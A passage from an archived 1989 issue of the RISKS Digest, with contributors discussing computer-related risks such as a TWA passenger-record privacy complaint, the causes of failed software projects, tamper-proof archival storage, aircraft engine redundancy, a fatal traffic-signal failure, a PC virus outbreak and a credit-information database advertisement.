describing him as "obnoxious".

  London-based systems engineer David Burns saw the screen when he
inquired about some lost luggage on returning to Los Angeles airport
from Hawaii in October.  He asked for a screen print and found it
contained details of all the comments he had made to TWA staff
including 'Pax (passenger) said do something constructive', 'Pax hung
up phone', 'Pax obnoxious'.  He said most of the details were not
entirely accurate.

  Burns wrote to the Data Protection Registrar after being given
conflicting information by TWA about whether the records were deleted when
the lost baggage was eventually found, or were kept for reference.

  John Lamidey, the assistant data protection registrar in charge
of investigations, said Burns' complaints are 'enough for me to
think we should look at it further'. He appointed an investigator to
visit TWA and expects to report back this month.

  Burns said that, after returning from holiday and eventually recovering
the lost suitcase from another airline, he rang TWA Baggage Services
in London to see if the luggage was still recorded as missing. He was
told it was.

  Three people, including the head of passenger service, told him
the report which contained his details could not be given to him as
it was not company policy, even though the data was kept on the
system for three months.

  He then requested the information under the Data Protection Act.

[[which gives those in the UK the right to see information held on computers
about them, with certain exceptions dictated by national security, etc.]]


  Brian Johnson, manager of personnel and administration for TWA in
the UK, wrote back to say 'no material is held by TWA by way of
magnetic media which contains your name.'  A TWA official said
the data had been deleted.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
(Too) Intelligent Network News mailing
</A>
</H3>
<address>
Ralph A. Shaw
&lt;<A HREF="mailto:ras@rayssd.RAY.COM ">
ras@rayssd.RAY.COM 
</A>&gt;
</address>
<i>
Fri, 13 Jan 89 12:55:07 est
</i><PRE>

Something I got in the mail today sounded more Orwellian than I liked, I
thought I would pass it along.  It was part of a subscription recruitment
mailing from Intelligent Network News  of Alexandria, Va.  (Any security-
minded Intelligence organizations based in Alexandria you can think of? :?)

&gt;"Intelligent networks will dominate our industry's future and force every
&gt;company to rethink the way they do business.
&gt;
&gt;For example:
&gt;
&gt;	Someday the public switched telephone network might track you
&gt;down in New York to tell you, "There's a leak in the basement of your
&gt;house in Denver.  The plumber has already been called.  He's reviewed
&gt;the service history of yoyur address, and thinks that it's probably
&gt;time to replace the blow-out valve on your water heater. Please respond."
&gt;The repair could be complete, further damage avoided, and the bill
&gt;paid by the time you return home, all thanks to nationwide intelligent
&gt;network services.
&gt;	  .....
&gt;Clearly, this evolution will create money-making opportunities for
&gt;those with the will and wits to recognize them.

Yes, just what I'm afraid of...
-- 
Ralph Shaw	Raytheon Co. (SSD) 		&lt;ras@rayssd.ray.com&gt;

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Information protection in Europe
</A>
</H3>
<address>
&lt;<A HREF="mailto:smb@research.att.com">
smb@research.att.com
</A>&gt;
</address>
<i>
Tue, 17 Jan 89 22:53:51 EST
</i><PRE>

The October '88 issue of Cryptologia has an interesting article entitled
``European Needs and Attitudes Towards Information Security''.  The
author (a founder of a firm that devises cryptographic algorithms, and
hence not an unbiased source) claims that the free market is driving
banks and other financial institutions towards better protection of
their data; he asserts that banks have suffered a loss of business
when their inability to keep data confidential has been demonstrated.

Of particular interest to this audience is his description of the (perceived)
threats in Europe.

	Europeans do not particularly need protection against
	``hackers'' or petty criminals.  They need protection against
	organized crime, major corporations and governments.  Such
	opponents are characterized by the presence of serious
	motivation (and therefor the willingness to expend significant
	sums to attack a system), access to substantial resources, and
	the possession or ability to purchase whatever technological
	expertise is required.

He then goes on to relate three actual attacks.  In the first, organized
crime invested $5,000,000 up front in technical preparations; the gain
(actual or potential isn't clear from the article) is estimated to be
100 times that.  The second involves a government spying on bank data in
another country; he implies, though does not state, that it was the U.S.
government that did the spying.  Apparently, the bank suffered serious
loss of business when its vulnerability became known.  Finally, he
describes the plight of ``extractive industries'', whose competitors,
both private and state-owned, regularly mount sophisticated electronic
spying operations against them.

If the claims are accurate, the difference in attitudes is fascinating.

		--Steve Bellovin

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Losing systems -- and Structured Programming
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 00:19:21 EST
</i><PRE>

It is worth remembering that the original meaning of "structured programming"
followed the English usage in which "structured" means, approximately,
"organized", and that the usage or non-usage of certain control constructs was
suggested as a means to that end, not an end in itself.  One can often get a
good laugh by doing a global substitution of "organized" for "structured" in a
pronunciamento from either side -- it tends to make both sides' arguments sound
ridiculous.  As it should:  it is silly to confuse organization with a list of
permitted constructs, and equally silly to criticize the desire for
well-organized code on the basis of such confusion.
                                      Henry Spencer at U of Toronto Zoology

</PRE>
<HR><H3><A NAME="subj4.2">
 Structured Programming
</A>
</H3>
<address>
Lynn R Grant 
&lt;<A HREF="mailto:Grant@DOCKMASTER.ARPA">
Grant@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 12:43 EST
</i><PRE>

I have been a proponent of structured programming for many years, and I
have found that there is really only one rule:  think about the poor guy
who is going to have to maintain the program you are writing.  All the
other rules about indentation and goto-lessness simply follow from that.

The guy who ends up maintaining your program may be some rookie, or it
may be a busy programmer who doesn't have time to carefully scrutinize
your code, or it may be you six months down the road, after you've
forgotten what you had in mind when you wrote the program.

Whatever you can do to make it easier for this guy to understand your
program will cut down the chances for errors (and will keep him from
putting you on his bad-guy list after having to fight with your code).

    Lynn Gran
    Technical Consultant
    Computer Associates International, Inc.

</PRE>
<HR><H3><A NAME="subj4.3">
re: Losing Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:denbeste@BBN.COM">
denbeste@BBN.COM
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 10:12:51 -0500
</i><PRE>

In Risks 8.9, David Marks (djm408@tijc02.UUCP) lays much of the blame for
"losing systems" on the narrow attitude of management which they derived from
the educational system.

Briefly, his reasoning goes:
   1. Business types don't learn about computers and don't care about them
   2. Engineers don't learn about business and don't care about it
   3. There is therefore no common ground on which to meet.

Premise 2 is nearly completely true - the average software engineer couldn't
care less about the realities of business. But I have not found Premise 1 to be
true to anything like the same extent. No matter where I've worked, I am
constantly running into business folks who are trying to understand computers -
out of intellectual interest, "nift" factor, or the obvious fact that there is
a shortage of computer-literate business people and thus it is a good way to
advance a career (and the free market wins again...).

I think that there is an entirely different reason for the failure of the
projects cited three or four references ago: Usually a project like this is
specified not by the ultimate users of the service the computer will provide,
but rather by a supplier in the form of a consultant contracted to buy the
hardware and write the software. The consultant has no vested interest in the
resulting software working correctly - he only has a vested interest in the
project being big and expensive. The consultant wins once the contract is
signed - everything after that is less important.

If those who have the need have no control, and those who have control have no
need, then disaster will always strike. It doesn't even matter if they are
talking to each other.

Steven C. Den Beste,   BBN Communications Corp., Cambridge MA
denbeste@bbn.com(ARPA/CSNET/UUCP)    harvard!bbn.com!denbeste(UUCP)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Ground proximity warning
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 00:19:41 EST
</i><PRE>

&gt;     "Note: the GPWS will not provide a warning if an airplane is flying
&gt;     directly towards a vertical cliff."

It's worth noting that solutions to this have been proposed and rejected.  The
problem with the standard GPWS is that it basically looks down, not forward, so
it fails in the presence of abruptly-changing terrain.  (The vertical cliff is
only the extreme case; rapidly-rising terrain will give a warning, but often
too late for it to be useful.)  At least one company has proposed a more
sophisticated scheme in which the "warning surface", so to speak, is not a
point underneath the aircraft but a sort of ski-shaped surface extending a
considerable distance forward.  Nobody was interested, so the proposal was
shelved.
                                     Henry Spencer at U of Toronto Zoology

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
WORM storage and archival records
</A>
</H3>
<address>
RAMontante 
&lt;<A HREF="mailto:bobmon@iuvax.cs.indiana.edu">
bobmon@iuvax.cs.indiana.edu
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 00:46:42 EST
</i><PRE>

Steve Phillipson proposes once-writable storage as a means to guarantee that
archival records have not been tampered with.  The idea is that the
information, once recorded, can't be changed.  The idea is fundamentally
flawed, however, for reasons involving the digital nature of most such media.

Typed or handwritten documents, photographs, audio tape recordings, all could
be trusted (once) because you could detect alterations in them, AND ALSO
because you could determine that the item you had was the original.  The
letters on a ypewriter have "personalized" defects, for example.  More to the
point, tape recorders and cameras add their own high-frequency losses or image
blurs to the signals they record; and if you make a copy of the original tape
or photo, there is unavoidable degradation of the information and addition of
machine-related "noise" to brand the copy as such.  Analog video tape is
another example -- broadcast quality tapes are unusable after a few generations
of copying.

Digital media don't suffer from this degradation, though.  I get a new program
for my PC at home, put a blank disk of the same brand in the machine, and type
"DISKCOPY".  Strip the label off, and you can't tell which disk is the
original.  By the same token, if I have my "archived" Shakespearean sonnets on
a WORM disk, I simply read an image of the disk into memory, edit a few lines
and write the new image onto a fresh WORM disk.  Presto -- bogus Shakespeare on
a "tamper-proof" disk.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: 3 vs. 2 engined airplanes
</A>
</H3>
<address>
Steve Jay
&lt;<A HREF="mailto:shj@ultra.UUCP ">
shj@ultra.UUCP 
</A>&gt;
</address>
<i>
Tue, 17 Jan 89 21:38:36 PST
</i><PRE>

In RISKS 8.9, Jordan Brown says

&gt; I don't believe a 727 can fly on one engine.  It must have two.

&gt; A three-engine airplane has a higher probability of having a failure in
&gt; the first place, and when it does have a failure it then has two points
&gt; of failure, EITHER of which will cause an accident.

I think he's wrong on both counts.  I have no specific knowledge in this
area, but I'm almost certain that a 727 CAN maintain level flight,
at least a some altitudes, on one engine.  Also, there was a highly publicized
incident a couple of years ago when a Lockheed TriStar flying out of
Florida almost crashed into the ocean because a mechanic had left
out oil seals after maintenance on all three engines.  As I remember it,
the pilot got back safely only because he was able to keep one
engine going.

Even if a 3 engine plane can't stay level on one engine, it will certainly
have a much lower rate of decent with one engine going than with
none, giving the pilot a lot longer to deal with the problem or find
a landing spot.

Even assuming that a 3 engined plane needs two engines to fly,
the odds of 2 engines failing on a 3 engined plane are much, much,
smaller than the odds of 1 engine failing on a 2 engined plane.


Steve Jay                       domain: shj@ultra.com
Ultra Network Technologies	Internet: ultra!shj@ames.arc.nasa.gov
101 Daggett Drive               uucp: ...ames!ultra!shj
San Jose, CA 95134		408-922-0100

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: Hackers break open US bank networks
</A>
</H3>
<address>
&lt;<A HREF="mailto:wolit@research.att.com">
wolit@research.att.com
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 09:13 EST
</i><PRE>

    Australian authorities are working around the clock ...
    leaks of supposedly securedial-up numbers for US defence sites, 
    including anti-ballistic missile launch silos, ...

The U.S. hasn't had any anti-ballistic missiles for more than a decade.  I can
only assume that the rest of the article is as accurate, especially since I've
seen nothing about the "break-in" in the papers or news wires in this country.

Jan Wolitzky, AT&amp;T Bell Labs, Murray Hill, NJ; 201 582-2998; mhuxd!wolit
(Affiliation given for identification purposes only)

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 Evidence
</A>
</H3>
<address>
&lt;<A HREF="mailto:WHMurray@DOCKMASTER.ARPA">
WHMurray@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 12:15 EST
</i><PRE>

&gt;   In recent issues of RISKS, various people have lamented the loss        
&gt;of confidence we are experiencing in archival records kept by computer.    
&gt;The problem seems to me less of a computer problem than a media problem,   
&gt;specifically, choosing media that is appropriate for archival storage.     

Would God that it were that simple.  If freedom from modification were
the only requirement for the medium, then there might be a solution.
However, for an increasing number of applications light in glassor
electricity in copper are the medium of choice for other reasons.

We require controls for the integrity and confidentiality of data that
are independent of both media and environment, and which can move with
the data.  

Fortunately for us they
are here.  Digital signatures and envelopes can be combined to mimic the
behavior of the media and environmental controls that we commonly use.
All that is required is a little bit of trusted storage in which to
store the private keys and a tiny trusted process in which to do the
code conversions.

Of course, I have just stated the requirement for both media and
environmental controls.  While they are still necessary, they are no
longer sufficient.

William Hugh Murray, Ernst &amp; Whinney                       

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.09.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.11.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-61</DOCNO>
<DOCOLDNO>IA012-000131-B037-171</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.11.html 128.240.150.127 19970217025108 text/html 21956
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:49:07 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 11</TITLE>
<LINK REL="Prev" HREF="/Risks/8.10.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.12.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.10.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.12.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 11</H1>
<H2> Thursday 19 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks of no backup systems for critical applications 
</A>
<DD>
<A HREF="#subj1.1">
Yoram Eisenstadter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer malfunction downs traffic lights, one killed, one injured    
</A>
<DD>
<A HREF="#subj2.1">
Scott Campbell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Chaos Theory Predicts Unpredictability 
</A>
<DD>
<A HREF="#subj3.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  China accused of software piracy 
</A>
<DD>
<A HREF="#subj4.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Friday the 13th Again 
</A>
<DD>
<A HREF="#subj5.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Computer error locks out politicians 
</A>
<DD>
<A HREF="#subj6.1">
D. Steele
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Losing Systems 
</A>
<DD>
<A HREF="#subj7.1">
Jerome H. Saltzer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Technical brilliance v. commercial acumen 
</A>
<DD>
<A HREF="#subj8.1">
Jerry Harper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  National Credit Information Network 
</A>
<DD>
<A HREF="#subj9.1">
Sidney Marshall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: Ethics of the Internet 
</A>
<DD>
<A HREF="#subj10.1">
John Gilmore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  RISKs of reading newspapers: Credit card fraud is not hacking. 
</A>
<DD>
<A HREF="#subj11.1">
Mike Van Pelt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Counting engines 
</A>
<DD>
<A HREF="#subj12.1">
Don Alvarez
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks of not having backup systems for critical applications
</A>
</H3>
<address>
Yoram Eisenstadter 
&lt;<A HREF="mailto:yoram@garfield.cs.columbia.edu">
yoram@garfield.cs.columbia.edu
</A>&gt;
</address>
<i>
Thu, 19 Jan 89 00:16:37 EST
</i><PRE>

The following article, which appeared in the "Metropolitan Diary"
section of today's New York Times, illustrates the risk of not having
backup systems for super-critical computerized applications.

         The other day, Gloria Ross was late for an appointment at a
    company on the Avenue of the Americas.  She holds herself
    blameless for being tardy and in defense she offers this
    explanation:
	 The high-technology building where the company has its
    offices has a computerized directory.  To find the floor of the
    person you wish to visit, you push a button with the first letter
    of the last name.
	 Aware of this procedure, Ms. Ross pressed the button marked
    "O" on one of the computer monitors mounted on a large black
    column.  Nothing happened.  A guard told her to try the next
    column.  Again, nothing.  The computer was down.  Her next stop:
    the information desk in the lobby.
	 "I get my information the same way you do, lady," the man at
    the desk said, informing her that even he did not have a printed
    directory...

The article goes on to describe the chaos that ensued in the building, with
"dozens of people desperately cruising from floor to floor" looking for the
right offices.  Let's hope that the building's managers learned the obvious
lesson from this incident.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer malfunction downs traffic lights. One killed, one injured.
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Wed, 18 Jan 1989 22:48:49 PST
</i><PRE>

One child was killed and another injured [Mon 9 Jan 1989] when they were hit
by a truck after entering a crosswalk where the pedestrian signals were not
working.  The malfunction was caused by a computer error that affected
traffic signals at 22 school crossings.  The pedestrian signal cycles failed
to switch to the school schedule.  The cause reportedly may have been a
breakdown in the radio communications between a computer in Colorado Springs
and an atomic clock in Boulder.  [Colo Spgs Gazette Telegraph, 10 and 11 Jan
1989; contributed by Scott Campbell, PAR Gov't Sys Corp, Colo Spgs.]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Chaos Theory Predicts Unpredictability 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Wed, 18 Jan 1989 22:39:33 PST
</i><PRE>

A physicist who applied the new mathematics of `chaos theory' to the Star Wars
missile shield foudn that the equations pointed again and again to crisis and
war or -- at best -- a continued and precarious balance of terror.  ``The
question is not really Star Wars, but what do you do if all you can predict is
unpredictableness?'' Alvin M. Saperstein of Wayne State University asked [at
the AAAS meeting in San Francisco].  [From an article by Charles Petit, SF
Chronicle, 18 Jan 1989, p.  A18]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
China accused of software piracy
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Wed, 18 Jan 1989 22:32:31 PST
</i><PRE>

Beijing (Washington Post, 18 Jan 1989) --
American companies are losing "many millions" of dollars in potential 
business in China because the companies' computer softwae has been widely
pirated...  China has no copyright law of its own...  

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Friday the 13th Again
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Wed, 18 Jan 1989 22:28:34 PST
</i><PRE>

There were various reports of Friday-the-13th virus deletions in Britain,
attacking MS-DOS systems.  The so-called virus "has been frisky and
hundreds of people, including a large firm with over 400 computers, have
telephoned with their problems," according to Alan Solomon, director of S
and S Enterprises, a data recovery center in Chesham.  The virus reportedly
bore similarities to the Friday the 13th Israeli virus (13 May 1988, the
previous Friday the 13th).  [Source: SF Chronicle, 14 Jan 1989, p. B1]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Computer error locks out politicians
</A>
</H3>
<address>
D. Steele
&lt;<A HREF="mailto:uivkey@NADC.ARPA ">
uivkey@NADC.ARPA 
</A>&gt;
</address>
<i>
Thu, 19 Jan 89 09:27:15 EST
</i><PRE>

	Just to show that computer systems play no favorites in politics,
local news reports are blaming a computer error for denying Pennsylvania
Republicans tickets and access to many of the Presidential inauguration balls
and festivities. The politicians are complaning "its like being all
dressed up with no place to go".

Submitted by Scott Berger, Naval Air Development Center, Warminster, PA

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
re: Losing Systems
</A>
</H3>
<address>
 Jerome H. Saltzer 
&lt;<A HREF="mailto:Saltzer@LCS.MIT.Edu">
Saltzer@LCS.MIT.Edu
</A>&gt;
</address>
<i>
Thu, 19 Jan 89 12:31:05 gmt
</i><PRE>

The question as to why there are so many losing systems may have a simpler,
more fundamental answer than has been suggested in the contributions over the
last couple of weeks.  So far, those contributions have (1) suggested
incompetence in management or technical ability, and (2) questioned some of the
currently fashionable magic bullets, such as structured programming.

I believe that the more fundamental answer is that the pace of improvement of
hardware technology in the computer business has, for 35 years now, simply been
running faster than our ability to develop the necessary experience to use it
effectively, safely, and without big mistakes.

The losing systems almost always contain some elements of newness; in fact on
close inspection they usually contain several such elements.  (If someone
claims there is nothing new in a project that involves software development,
then ask why they aren't just using previously existing software.  It is the
attraction of taking advantage of new possibilities, usually as the result of
hardware being either more functional or cheaper than it used to be, that leads
to new software systems.)  If these new elements were to arrive on the scene
one at a time, and spaced far enough apart that thorough experience could be
assimilated with each previous new element, then I submit that traditional
engineering practice, as applied to pyramids, cathedrals, bridges, consumer
electronics, and even airplanes, would lead to higher success probabilities.
Mistakes would still be made, but they would tend to occur on the far-out
projects that are expected to carry an element of risk, rather than the ones
that intuitively seem like they ought to be routine, such as automating the
county records.

Arguing that managers should become computer wizards, or offering structured
programming to fix the problem, just don't seem to me to get to the heart of
this more fundamental issue.

When the technology ground rules change at a rate that is ten times faster than
in other engineering disciplines, it would seem that unless one can figure out
how to accumulate and assimilate experience also at a ten-times-faster rate,
system failures are an expected result.  Perhaps a more interesting question is
how it is that some computer systems manage to be successful.  I observe two
related things that are often associated with successful systems:

     1.  Those systems that are successful are usually conservative, with
     somewhat simpler objectives than the state of technology would have
     permitted.

     2.  Systems that are succesful often had the management advantage
     of a system dictator who had the absolute power to say NO to
     ideas that didn't seem to fit in.  A dictator is one of the
     few mechanisms that can keep an implementation conservative in
     the face of pressures to be state-of-the-art.

My conclusion from these observations is that since:  (1) it is hard to be
conservative in the face of tempting technology advances; and (2) appointing
dictators isn't a common management practice; successful systems aren't very
common either.  And having conservative goals and a dictator doesn't guarantee
that the system will be winning or that its future users will like it, it just
sets the stage for that possibility.
 					         Jerry Saltzer

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Technical brilliance v. commercial acumen
</A>
</H3>
<address>
Jerry Harper 
&lt;<A HREF="mailto:jharper@euroies.UUCP">
jharper@euroies.UUCP
</A>&gt;
</address>
<i>
Thu, 19 Jan 89 15:34:31 GMT
</i><PRE>

Steven C. Beste made the point that managers are trying to come to grips with
computer technology moreso now than ever before; this I would generally agree
with subject to the caveat that the degree of managerial immersement in the
technology will never match that of the technical expert.  One of the last
companies I was consultant to actually lost sales because the management didn't
understand either the product or the market, and knowing both was especially
important as the company was making the transition from conventional DP through
Cobol to providing a logic programming environment on a mainframe.  The
permanent technical staff couldn't have sold their souls for ice pops and the
management were having fiercesome difficulty in making the paradigmatic shift
from Cobol inspired projects to AI (expert system bespoke applications).  Just
as you thought the management was grasping the core issues Sisyphus would pop
up and roll progress back.  Even more lamentable were the salesforce who new
sweet f.a. about either methodology.  Because AI was "sexy" the salespeople
were inclined to promise the earth (one salesman reckoned he had a contract for
a complete CASE system for a major motor manufacturer in the UK even though
neither he nor the company had any experience in this area) and take umbrage
when it was explained that the company simply couldn't deliver.  The net result
was that the company became unsatisfactory for quite a number of the technical
people who carried their skills elsewhere.Nevertheless, observing the company's
progress from a distance it seems to be doing quite well and the mangement have
made the learning curve.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
National Credit Information Network
</A>
</H3>
<address>
&lt;<A HREF="mailto:marshall.wbst@Xerox.COM">
marshall.wbst@Xerox.COM
</A>&gt;
</address>
<i>
18 Jan 89 15:50 EST
</i><PRE>

I just received in the mail as part of the BYTE magazine package of postcards
from manufacturers etc. a post card selling a program capable of accessing the
National Credit Information Network (if I qualify). Here is the text of the
postcard (the typography of the card was ragged and this is as exact as I could
make it):


NATIONAL CREDIT INFORMATION NETWORK
ON-LINE ACCESS PACKAGE

AVOID SLOW PAY - NO PAY     HIRE QUALITY EMPLOYEES

SAVE $200.00         $498.00 *       SAVE $200.00

-------------------------------------------------------
* Federal Trade Commission Regulated data "
* 250 Million Credit Profiles on Individuals
* 9 Million Credit Profiles On Business
* Drivers License Records from 49 of 50 States
* Nationwide Tracing Of Social Security Numbers
* Information / 1000 Credit Bureaus Nationwide
-------------------------------------------------------

IF YOU QUALIFY FOR ACCESS...THIS INFORMATION IS IDEAL FOR:

-------------------------------------------------------
* Qualifying Clients, Buyers, Sellers, Potential Partners
* Pre-employment Qualification for your firm
* Collecting Delinquent Accounts made easier
* Nationwide Skip Tracing via Social Security Number
* Child Support Litigation and/or Collection Data
* Extension of Credit -OR- Opening an Account
-------------------------------------------------------

FREE ON-LINE DEMO

"MONEY-BACK GUARANTEE
 IF YOU DO NOT QUALIFY

-------------------------------------------------------
CALL NOW for an immediate on-line presentation
Set your computer/modem to support {300, 1200 or 2400 baud}, (8-N-1 or
7-E-1 format}, &amp; {full duplex and xon/xoff handshaking}.
Have your modem dial the NCI Network.
From Cincinnati, Ohio dial 521-4420  Nationwide dial 1-513-521-4420
 After connection, slowly press the [ENTER] key  4 times.
When prompted for a Username: type DECK4  then press [ENTER]
-------------------------------------------------------

For more information use the reverse side of this card or call
1-800-242-6246

Is this scary or what?

--Sidney Marshall

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Ethics of the Internet
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:gnu@toad.com ">
gnu@toad.com 
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 17:29:00 PST
</i><PRE>

Someone [Cliff Stoll neglected to say who] wrote in "Ethics of the
Internet", draft RFC:  

&gt; The IAB strongly... characterized as unethical and unacceptable any
&gt; activity which purposely: ... or (e) compromises the privacy of users ...

Does the NSA monitoring the Internet come under these guidelines?
Or are there some things that THEY are secretly allowed to do, while
WE are publicly told that these things are unethical and unacceptable?

If they aren't monitoring the net, why do they have 5 IMPs?

John Gilmore    {sun,pacbell,uunet,pyramid,amdahl}!hoptoad!gnu    gnu@toad.com

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
RISKs of reading newspapers: Credit card fraud is not hacking.
</A>
</H3>
<address>
Mike Van Pelt 
